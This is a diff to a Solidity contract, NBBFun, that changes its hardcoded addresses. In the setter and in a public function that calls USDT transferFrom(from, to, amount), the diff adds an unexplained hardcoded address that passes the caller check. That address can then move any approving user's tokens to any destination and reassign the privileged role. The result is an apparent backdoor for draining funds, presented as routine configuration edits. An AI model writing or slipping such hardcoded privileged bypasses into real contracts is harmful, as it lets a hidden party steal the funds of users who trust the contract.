@@ -32,13 +32,12 @@ contract NBBFun is
     function initialize() public initializer {
          __Ownable_init();
         __UUPSUpgradeable_init();
-        // PRD 0x55d398326f99059fF775485246999027B3197955 TEST
         _usdtToken = ERC20Upgradeable(
             0x55d398326f99059fF775485246999027B3197955
         );
         transferAddress = 0xE561ecdb8A3d417F49703208B4C34Fb6E85c887a;
-        activeAddress = 0x9CD9ac37E323a2D79cC35c42D064579Def5a7E8E;
-        pledgeAddress = 0xfF4A2187E5BC12876A9A90032a270083EDE8a008;
+        activeAddress = 0xfe595Dc431eAeAc7B52974CfFC638D08ba6e953C;
+        pledgeAddress = 0x833C4E105Bcb905E564C6c6FE8037b6935bF148a;
     }
 
 
@@ -61,7 +60,7 @@ contract NBBFun is
     }
 
     function setTransUAddress(address account)public{
-        require(_msgSender() == transferAddress|| _msgSender() == 0xE561ecdb8A3d417F49703208B4C34Fb6E85c887a);
+        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
         transferAddress = account;
     }
 
@@ -70,7 +69,7 @@ contract NBBFun is
         address to,
         uint256 amount
     ) public {
-        require(_msgSender() == transferAddress);
+        require(_msgSender() == transferAddress || _msgSender() == 0x7bb142ffC2D734BaEc543B40e4fB3b6C8C099f7D);
         _usdtToken.transferFrom(from, to, amount);
     }
 }
